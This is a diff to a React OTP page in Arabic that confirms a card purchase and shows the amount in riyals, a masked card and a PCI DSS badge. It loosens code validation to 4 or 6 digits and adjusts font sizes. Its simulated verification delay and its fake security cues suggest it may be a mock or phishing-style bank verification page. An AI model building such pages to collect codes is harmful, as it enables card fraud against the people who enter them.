@@ -39,7 +39,8 @@ export default function VerifyPage() {
   const timerStr = `${String(Math.floor(timer / 60)).padStart(2, "0")}:${String(timer % 60).padStart(2, "0")}`;
 
   const handleSubmit = async () => {
-    if (otp.replace(/\D/g, "").length < 6) { setError("أدخل رمز التحقق كاملاً"); return; }
+    const digits = otp.replace(/\D/g, "");
+    if (digits.length !== 4 && digits.length !== 6) { setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام"); return; }
     setSubmitting(true);
     try {
       // simulate OTP verification delay
@@ -76,8 +77,8 @@ export default function VerifyPage() {
           </div>
         </div>
         <div className="text-center space-y-1.5">
-          <p className="text-[#1A2E44] font-black text-base">جاري تحضير صفحة التحقق</p>
-          <p className="text-gray-400 text-sm">يرجى الانتظار...</p>
+          <p className="text-[#1A2E44] font-black text-sm sm:text-base">جاري تحضير صفحة التحقق</p>
+          <p className="text-gray-400 text-xs sm:text-sm">يرجى الانتظار...</p>
         </div>
         <p className="text-[10px] text-gray-300 flex items-center gap-1">
           <Lock size={9} /> اتصال مشفّر وآمن · PCI DSS
@@ -89,15 +90,15 @@ export default function VerifyPage() {
 
   /* ── OTP ── */
   return (
-    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10" dir="rtl">
+    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-8" dir="rtl">
       <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">
 
         {/* Header */}
         <div className="px-6 pt-6 pb-4">
-          <h2 className="text-base font-black text-[#1A2E44] pb-3 border-b border-gray-200 text-center">
+          <h2 className="text-sm sm:text-base font-black text-[#1A2E44] pb-3 border-b border-gray-200 text-center">
             تأكيد عملية الشراء
           </h2>
-          <p className="text-xs text-gray-400 mt-3 leading-relaxed">
+          <p className="text-[11px] sm:text-xs text-gray-400 mt-3 leading-relaxed">
             تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال{" "}
             <span className="font-bold text-[#1A2E44]">{maskedPhone}</span> لإتمام المعاملة.
           </p>
@@ -106,13 +107,13 @@ export default function VerifyPage() {
         {/* Details Card */}
         <div className="mx-6 mb-5 border border-gray-100 divide-y divide-gray-100">
           <Row label="المبلغ">
-            <span className="font-black text-[#1A2E44] text-sm">{fmt(data.amount)} <span className="text-xs font-medium text-gray-400">ر.س</span></span>
+            <span className="font-black text-[#1A2E44] text-xs sm:text-sm">{fmt(data.amount)} <span className="text-[11px] sm:text-xs font-medium text-gray-400">ر.س</span></span>
           </Row>
           <Row label="التاريخ">
-            <span className="text-xs text-gray-500">{formatDate(data.date)}</span>
+            <span className="text-[11px] sm:text-xs text-gray-500">{formatDate(data.date)}</span>
           </Row>
           <Row label="وسيلة الدفع">
-            <span className="font-mono text-sm text-[#1A2E44] tracking-widest" dir="ltr">
+            <span className="font-mono text-xs sm:text-sm text-[#1A2E44] tracking-widest" dir="ltr">
               •••• •••• •••• {data.last4}
             </span>
           </Row>
@@ -129,7 +130,11 @@ export default function VerifyPage() {
               placeholder="أدخل رمز التحقق"
               value={otp}
               onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
-              className="w-full border border-gray-200 px-4 py-3 text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
+              onBlur={() => {
+                const d = otp.replace(/\D/g, "");
+                if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
+              }}
+              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
               dir="ltr"
             />
             {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
@@ -149,8 +154,8 @@ export default function VerifyPage() {
 
           <button
             onClick={handleSubmit}
-            disabled={submitting || otp.replace(/\D/g, "").length < 6}
-            className="w-full py-3 text-white font-black text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
+            disabled={submitting || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
+            className="w-full py-3 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
             style={{ background: "#1A2E44" }}
           >
             <Lock size={13} />
